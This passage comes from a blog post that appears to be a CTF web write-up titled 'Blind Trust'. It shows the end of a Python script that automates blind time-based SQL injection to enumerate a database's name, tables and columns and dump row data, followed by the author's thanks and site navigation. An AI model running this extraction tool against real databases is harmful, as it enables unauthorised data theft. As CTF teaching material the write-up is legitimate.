                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[!] No columns found in </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Found </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">columns</span><span class="p">)</span><span class="si">}</span><span class="s"> columns</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="n">columns</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">column</span><span class="p">)</span>
        <span class="n">column_offset</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">return</span> <span class="n">columns</span>

<span class="k">def</span> <span class="nf">extract_table_data</span><span class="p">(</span><span class="n">table_name</span><span class="p">,</span> <span class="n">columns</span><span class="p">,</span> <span class="n">database_name</span><span class="p">):</span>
    <span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">row_offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">max_rows</span> <span class="o">=</span> <span class="mi">20</span>
    <span class="n">table_start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] STARTING DATA EXTRACTION: Table </span><span class="sh">'</span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">row_offset</span> <span class="o">&lt;</span> <span class="n">max_rows</span><span class="p">:</span>
        <span class="n">row_data</span> <span class="o">=</span> <span class="p">{}</span>
        <span class="n">row_found</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="n">row_start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>

        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Extracting row </span><span class="si">{</span><span class="n">row_offset</span><span class="si">}</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">column</span> <span class="ow">in</span> <span class="n">columns</span><span class="p">:</span>
            <span class="n">value</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span>
                <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="s">.</span><span class="si">{</span><span class="n">column</span><span class="si">}</span><span class="s"> row </span><span class="si">{</span><span class="n">row_offset</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span>
                <span class="n">generate_data_payload</span><span class="p">,</span>
                <span class="n">DATA_CHARS</span><span class="p">,</span>
                <span class="n">table_name</span><span class="p">,</span>
                <span class="n">column</span><span class="p">,</span>
                <span class="n">row_offset</span><span class="p">,</span>
                <span class="n">database_name</span>
            <span class="p">)</span>
            <span class="k">if</span> <span class="n">value</span><span class="p">:</span>
                <span class="n">row_found</span> <span class="o">=</span> <span class="bp">True</span>
                <span class="n">row_data</span><span class="p">[</span><span class="n">column</span><span class="p">]</span> <span class="o">=</span> <span class="n">value</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">row_data</span><span class="p">[</span><span class="n">column</span><span class="p">]</span> <span class="o">=</span> <span class="bp">None</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">row_found</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[!] No more data in table </span><span class="sh">'</span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="sh">'"</span><span class="p">)</span>
            <span class="k">break</span>

        <span class="n">data</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">row_data</span><span class="p">)</span>
        <span class="n">row_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">row_start</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Completed row </span><span class="si">{</span><span class="n">row_offset</span><span class="si">}</span><span class="s"> in </span><span class="si">{</span><span class="nf">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="n">row_time</span><span class="p">)</span><span class="si">}</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">col</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">row_data</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  - </span><span class="si">{</span><span class="n">col</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">row_offset</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="n">table_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">table_start</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] FINISHED TABLE: </span><span class="sh">'</span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="sh">'</span><span class="s"> - </span><span class="si">{</span><span class="nf">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s"> rows in </span><span class="si">{</span><span class="nf">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="n">table_time</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="sh">'</span><span class="s">=</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">discover_database_structure</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] No predefined structure - starting full discovery</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">structure</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span> <span class="sh">''</span><span class="p">,</span> <span class="sh">'</span><span class="s">tables</span><span class="sh">'</span><span class="p">:</span> <span class="p">{}}</span>

    <span class="n">db_name</span> <span class="o">=</span> <span class="nf">extract_database_name</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">db_name</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Failed to extract database name</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="n">structure</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">db_name</span>

    <span class="n">tables</span> <span class="o">=</span> <span class="nf">extract_tables</span><span class="p">(</span><span class="n">db_name</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">tables</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] No tables found</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">structure</span>

    <span class="k">for</span> <span class="n">table</span> <span class="ow">in</span> <span class="n">tables</span><span class="p">:</span>
        <span class="n">columns</span> <span class="o">=</span> <span class="nf">extract_columns</span><span class="p">(</span><span class="n">table</span><span class="p">,</span> <span class="n">db_name</span><span class="p">)</span>
        <span class="n">structure</span><span class="p">[</span><span class="sh">'</span><span class="s">tables</span><span class="sh">'</span><span class="p">][</span><span class="n">table</span><span class="p">]</span> <span class="o">=</span> <span class="n">columns</span>

    <span class="k">return</span> <span class="n">structure</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">database_name</span>
    <span class="n">global_start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] STARTING EXTRACTION AT: </span><span class="si">{</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="n">strftime</span><span class="p">(</span><span class="sh">'</span><span class="s">%Y-%m-%d %H</span><span class="si">:</span><span class="o">%</span><span class="n">M</span><span class="si">:</span><span class="o">%</span><span class="n">S</span><span class="sh">'</span><span class="s">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Using proxy: </span><span class="si">{</span><span class="n">proxy</span><span class="p">[</span><span class="sh">'</span><span class="s">http</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] 2-delay confirmation | 4 max attempts | 3s threshold</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">database</span> <span class="o">=</span> <span class="nf">discover_database_structure</span><span class="p">()</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">database</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[!] Failed to discover database structure</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="n">database_name</span> <span class="o">=</span> <span class="n">database</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Database structure loaded:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Database: </span><span class="si">{</span><span class="n">database</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">table</span><span class="p">,</span> <span class="n">columns</span> <span class="ow">in</span> <span class="n">database</span><span class="p">[</span><span class="sh">'</span><span class="s">tables</span><span class="sh">'</span><span class="p">].</span><span class="nf">items</span><span class="p">():</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  - Table: </span><span class="si">{</span><span class="n">table</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">    Columns: </span><span class="si">{</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">columns</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">[+] Starting data extraction...</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">table_name</span><span class="p">,</span> <span class="n">columns</span> <span class="ow">in</span> <span class="n">database</span><span class="p">[</span><span class="sh">'</span><span class="s">tables</span><span class="sh">'</span><span class="p">].</span><span class="nf">items</span><span class="p">():</span>
        <span class="n">data</span> <span class="o">=</span> <span class="nf">extract_table_data</span><span class="p">(</span><span class="n">table_name</span><span class="p">,</span> <span class="n">columns</span><span class="p">,</span> <span class="n">database</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">])</span>
        <span class="n">database</span><span class="p">[</span><span class="sh">'</span><span class="s">tables</span><span class="sh">'</span><span class="p">][</span><span class="n">table_name</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
            <span class="sh">'</span><span class="s">columns</span><span class="sh">'</span><span class="p">:</span> <span class="n">columns</span><span class="p">,</span>
            <span class="sh">'</span><span class="s">data</span><span class="sh">'</span><span class="p">:</span> <span class="n">data</span>
        <span class="p">}</span>

    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[+] FINAL DATABASE DUMP</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Database: </span><span class="si">{</span><span class="n">database</span><span class="p">[</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">table_name</span><span class="p">,</span> <span class="n">table_info</span> <span class="ow">in</span> <span class="n">database</span><span class="p">[</span><span class="sh">'</span><span class="s">tables</span><span class="sh">'</span><span class="p">].</span><span class="nf">items</span><span class="p">():</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">Table: </span><span class="si">{</span><span class="n">table_name</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Columns: </span><span class="si">{</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">table_info</span><span class="p">[</span><span class="sh">'</span><span class="s">columns</span><span class="sh">'</span><span class="p">])</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">table_info</span><span class="p">[</span><span class="sh">'</span><span class="s">data</span><span class="sh">'</span><span class="p">]:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">  No data found</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">continue</span>

        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="s">Data:</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">row</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">table_info</span><span class="p">[</span><span class="sh">'</span><span class="s">data</span><span class="sh">'</span><span class="p">]):</span>
            <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">Row </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">:</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">col</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">row</span><span class="p">.</span><span class="nf">items</span><span class="p">():</span>
                <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">  </span><span class="si">{</span><span class="n">col</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">val</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="n">total_time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">global_start</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="si">{</span><span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] EXTRACTION COMPLETED IN: </span><span class="si">{</span><span class="nf">timedelta</span><span class="p">(</span><span class="n">seconds</span><span class="o">=</span><span class="n">total_time</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[+] Finished at: </span><span class="si">{</span><span class="n">datetime</span><span class="p">.</span><span class="nf">now</span><span class="p">().</span><span class="n">strftime</span><span class="p">(</span><span class="sh">'</span><span class="s">%Y-%m-%d %H</span><span class="si">:</span><span class="o">%</span><span class="n">M</span><span class="si">:</span><span class="o">%</span><span class="n">S</span><span class="sh">'</span><span class="s">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="sh">'</span><span class="s">#</span><span class="sh">'</span><span class="o">*</span><span class="mi">60</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="final-note"><span class="me-2">Final Note</span><a href="#final-note" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>At the very least, I want to thank the author of this challenge ‚Äî it was a <strong>great challenge</strong>, truly.<br />
I had a lot of fun working on it, and more importantly, I <strong>learned a lot</strong> along the way.
see ya later &lt;33</p>
</div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
    <div class="post-meta mb-3">
      <i class="far fa-folder-open fa-fw me-1"></i>
      
      <a
        href="/categories/ctf/"
        >CTF</a
      >
    </div>
    

    <!-- tags -->
    
    <div class="post-tags">
      <i class="fa fa-tags fa-fw me-1"></i>
      
      <a
        href="/tags/web/"
        class="post-tag no-text-decoration"
      >Web</a>
      
      <a
        href="/tags/asc25/"
        class="post-tag no-text-decoration"
      >ASC25</a>
      
    </div>
    

    <div
      class="post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2"
    >
      <div class="license-wrapper">
          This post is licensed under this 
        <a href="https://mohamedaboelnasr.github.io">
          blog
        </a>
         by the author. 
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Blind%20Trust%20-%20Hell%E2%80%99s%20Executioner&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FBlind-Trust%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Blind%20Trust%20-%20Hell%E2%80%99s%20Executioner&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FBlind-Trust%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FBlind-Trust%2F&text=Blind%20Trust%20-%20Hell%E2%80%99s%20Executioner" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Penforce/">Penforce CTF</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Blind-Trust/">Blind Trust</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Reset-Writeup/">Reset Writeup</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Abusing-OG-Protocol-With-Macros/">Abusing OG Protocol With Macros</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Hiding-Your-Shell-code-inside-PE-File-Format/">Hiding Your Shell code inside PE File Format</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ad/">AD</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/asc25/">ASC25</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/maldev/">maldev</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/penforce/">Penforce</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">phishing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/wininternals/">wininternals</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  
    
  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/Penforce/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1757635200"
  data-df="ll"
  
>
  Sep 12, 2025
</time>

              <h4 class="pt-0 my-2">Penforce CTF</h4>
              <div class="text-muted">
                <p>In this post, I‚Äôm going to share four challenges I created for the Penforce Internship CTF Competition. The goal of these challenges was to give participants hands-on experience with different secu...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/Abusing-OG-Protocol-With-Macros/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>Abusing OG Protocol With Macros</p>
    </a>
  

  
    <a
      href="/posts/Penforce/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>Penforce CTF</p>
    </a>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>¬©
    <time>2025</time>

    
      <a href="https://twitter.com/Abo_Elnasr101">Aboelnasr</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ad/">AD</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web/">Web</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/asc25/">ASC25</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/maldev/">maldev</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/penforce/">Penforce</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">phishing</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/wininternals/">wininternals</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

